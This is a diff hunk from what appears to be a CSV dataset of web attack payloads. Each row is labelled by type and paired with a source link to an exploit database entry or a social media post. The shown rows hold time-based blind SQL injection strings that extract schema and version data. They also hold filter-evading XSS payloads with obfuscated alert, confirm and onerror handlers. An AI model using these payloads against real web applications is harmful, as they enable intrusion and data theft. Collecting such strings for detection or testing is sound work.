@@ -497,7 +497,7 @@ https://vulners.com/githubexploit/8292EFB2-7D48-5269-85E0-90F582B0CF95?utm_sourc
 https://vulners.com/githubexploit/8292EFB2-7D48-5269-85E0-90F582B0CF95?utm_source=rss&utm_medium=rss&utm_campaign=rss,SELECT CASE WHEN LENGTH((SELECT GROUP_CONCAT({column_name}) FROM {from_where} where table_schema = '{where}' and table_name = '{where2}'))={i} THEN sleep(3) ELSE sleep(0) END,sqli
 https://vulners.com/githubexploit/7A6411F4-C896-52AB-9725-D10DEBF9CD0F?utm_source=rss&utm_medium=rss&utm_campaign=rss,clicks%60%3DIF%28SUBSTRING%28version%28%29%2C1%2C1%29%3D5%2CSLEEP%2810%29%2Cnull%29--%20-,sqli
 https://twitter.com/TakSec/status/1786074467728515132, 1%27%22%26gt%3B%26lt%3BA%20HRef%3D%5C%22%20AutoFocus%20OnFocus%3Dtop%2F%2A%2A%2F%3F.%5B%27ale%27%252B%27rt%27%5D%281%29%26gt%3B,xss
-https://twitter.com/KN0X55/status/1786022967933046971, <A HRef=\" AutoFocus OnFocus=top/**/?.['al'%2B'ert'](1)>,xss
+https://twitter.com/KN0X55/status/1786022967933046971,%20%3CA%20HRef%3D%5C%22%20AutoFocus%20OnFocus%3Dtop%2F%2A%2A%2F%3F.%5B%27al%27%252B%27ert%27%5D%281%29%3E,xss
 https://twitter.com/PrinceOker79109/status/1786548416010498123, <Img Src=OnXSS OnError=confirm("Hacked_by_a7madn1")>,xss
 https://twitter.com/XssPayloads/status/1788748656390058340, &lt;foo%20bar=%250a%20onclick=&lt;your js code&gt;,xss
 https://twitter.com/Dharamveer_____/status/1788492033675440375, %3CSVG/oNlY=1%20ONlOAD=confirm(document.domain)%3E,xss
